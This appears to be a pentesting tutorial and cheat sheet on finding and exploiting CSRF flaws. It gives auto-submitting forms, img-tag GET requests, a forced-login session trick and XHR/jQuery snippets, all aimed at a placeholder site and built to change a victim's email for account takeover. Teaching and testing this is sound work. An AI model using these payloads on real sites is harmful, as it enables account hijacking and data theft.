# Finding and exploiting CSRF vulnerabilities

* Finding and exploiting `Cross-Site Request Forgery (CSRF)` vulnerabilities involves identifying unprotected state-changing actions and leveraging weak request validation to execute unauthorized operations on behalf of authenticated users.

## Finding CSRF vulnerabilities

1. **Identify state-changing actions** within the web application that alter user data or perform important operations, such as modifying personal details, processing purchases, transferring funds, or executing any API requests that update server-side resources. These actions are potential targets for CSRF attacks.
1. **Check for unprotected forms** within the application that submit data without a CSRF token or the `SameSite` cookie attribute, as this could expose them to CSRF attacks. CSRF tokens are server-generated unique values included in form submissions to prevent unauthorized request execution. To detect these weaknesses, use a web proxy tool like Burp Suite or OWASP ZAP to **intercept and analyze HTTP requests** examining request headers, cookies, and parameters.
1. **Test to confirm the CSRF vulnerability** by crafting a malicious request within an HTML page, utilizing a `form` or `image` tag to send an unauthorized request to the application:

    ```javascript
    <form action="https://vulnerable.tbl/email/update" method="POST">
        <input type="hidden" name="email" value="attacker@attacker.tbl">
        <input type="submit" value="Submit">
    </form>
    ```

    Visiting the crafted malicious page while authenticated in the target application will trigger the CSRF attack.

1. Additionally, as part of in-depth research, leverage a vulnerability scanner for automatic CSRF detection, inspect source code if accessible, perform SAST to uncover security risks, and evaluate the effectiveness of CSRF protections by attempting bypass techniques.

## Exploiting CSRF via state-changing requests (usually POST)

* CSRF attacks using the POST method are among the most common forms of CSRF. These attacks occur when a web application fails to implement security mechanisms (i.e, implementing CSRF tokens or using the `SameSite` attribute on cookies) to protect against unauthorized requests.
* An attacker can exploit this by crafting malicious HTML content that automatically triggers a POST request as soon as the user's browser renders the page.
  * Since browsers allow automatic form submission, attackers can initiate POST requests without user interaction, as long as the victim is logged into the targeted website.
* Unlike GET-based CSRF, POST-based CSRF usually allows attackers to target endpoints that require more structured input, which are typically used for state-changing operations.
* As example, consider a scenario where a web application has a vulnerable `/email/update` endpoint that permits users to update their email address via a POST request, requiring only the `email` parameter. An attacker could craft the following HTML page to exploit this weakness:

    ```html
    <html>
        <body>
            <form action="https://vulnerable.tbl/email/update" method="POST">
                <input type="hidden" name="email" value="attacker@attacker.tbl" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
    ```

## Exploiting CSRF via GET requests

* CSRF vulnerabilities may also be exploited via the GET HTTP method if endpoints permit state-changing operations through GET requests without proper protections.
* GET requests are typically intended for retrieving data, but if a web application uses GET for actions that modify state (e.g., changing user information or making updates), it also creates a significant security risk.
* In the following example, when the user clicks on the following link, its email will be changed to `attacker@attacker.tbl`, making the attacker gain control over the account:

    ```http
    https://vulnerable.tbl/email/update?email=attacker@attacker.tbl
    ```

  * Clicking the link while authenticated to `vulnerable.tbl` causes the browser to automatically send a GET request to the exposed endpoint.
* CSRF can also be exploited via the GET method by embedding the malicious link in an HTML element like an `<img>` tag. When the victim accesses a malicious website, the browser automatically processes the HTML and issues the GET request to the vulnerable endpoint without requiring user interaction:

    ```html
    <img src="https://vulnerable.tbl/email/update?email=attacker@attacker.tbl">
    ```

  * The request sent, containing the victim's authenticated session cookies, would trigger the state-changing operation, altering the user's email address to `attacker@attacker.tbl` without the victim's awareness or approval.
* As an example, after updating the victim’s email, the attacker could reset the password through the new email, effectively gaining complete control of the account.

## Exploiting CSRF via session fixation

* `Session fixation` is an attack where an attacker forces a user to use a predetermined session, effectively hijacking the user's session.
* In certain scenarios, a CSRF attack can be used to log a user into an account controlled by the attacker, overwriting any existing session the user may have had. This results in the user unknowingly operating under the attacker's session.
* Unlike traditional CSRF attacks that focus on unauthorized state changes, this variant manipulates user authentication, potentially leading to account hijacking, data exposure, or session-based tracking.
* The attack follows these steps:
  1. The attacker pre-creates an account (e.g., `attacker@attacker.tbl`) on the targeted vulnerable website.
  1. The attacker constructs a malicious webpage designed to force victims to log in to this account:

      ```html
      <form action="https://vulnerable.tbl/login" method="POST">
          <input type="hidden" name="email" value="attacker@attacker.tbl" />
          <input type="hidden" name="password" value="password123" />
      </form>
      <script>
          document.forms[0].submit();
      </script>
      ```

  1. When a user visits this page, their browser automatically submits the form, initiating a login request. If the server responds with:

      ```http
      Set-Cookie: sessionId=attacker_account_session_id; Secure; HttpOnly; Path=/
      ```

      The browser overwrites the victim's existing session cookie with the attacker account's session.

      > :older_man: The `Same-Origin Policy (SOP)` prevents JavaScript running in a given origin from accessing the content of a document loaded from a different origin. Technically, cross-origin requests are still possible, but JavaScript cannot read the responses. However, the browser continues to process them, including handling the `Set-Cookie` headers.

  1. Since the victim remains unaware of this manipulation, they may continue using the trusted application, believing they are still logged into their own account. However, all actions they perform are tied to the attacker's session.
* This technique is particularly dangerous in applications where users store personal information, payment details, or sensitive messages, as any data entered while under the attacker's session will be accessible to them.
* Attackers can also leverage this approach to track user interactions and harvest sensitive data, initiate fraudulent transactions using stored payment details, exploit account linking mechanisms to permanently associate the victim's actions with the attacker's controlled session.

## Common CSRF payloads

### HTML4 and HTML5 not requiring user interaction

|HTML tags|
|:--:|
|```<iframe src="URL" />```,<br/> ```<script src="URL" />```,<br/> ```<input type="image" src="URL" alt="" />```,<br/> ```<embed src="URL" />```,<br/> ```<audio src="URL" />```,<br/> ```<video src="URL" />```,<br/> ```<source src="URL" />```,<br/> ```<video poster="URL" />```,<br/> ```<link rel="stylesheet" href="URL" />```,<br/> ```<object data="URL" />```,<br/> ```<body background="URL" />```,<br/> ```<div style="background:url("URL")" />```,<br/> ```<style>body { background:url("URL") } </style> />```|

### HTML and JavaScript not requiring user interaction

```html
<form action="https://vulnerable.tbl/email/update" method="POST" id="CSRF" style="display: none;">
  <input name="email" value="attacker@attacker.tbl"/>
</form>
<script>document.getElementById("CSRF").submit()</script>
```

### JavaScript not requiring user interaction

  ```javascript
  <script>
    const url = "https://vulnerable.tbl/email/update";
    const params = "email=attacker@attacker.tbl";
    const CSRF = new XMLHttpRequest();
    CSRF.open("POST", url, false);
    CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    CSRF.send(params);
  </script>
  ```

  ```javascript
  $.ajax({
    type: "POST",
    url: "https://vulnerable.tbl/email/update",
    data: "email=attacker@attacker.tbl",
  });
  ```
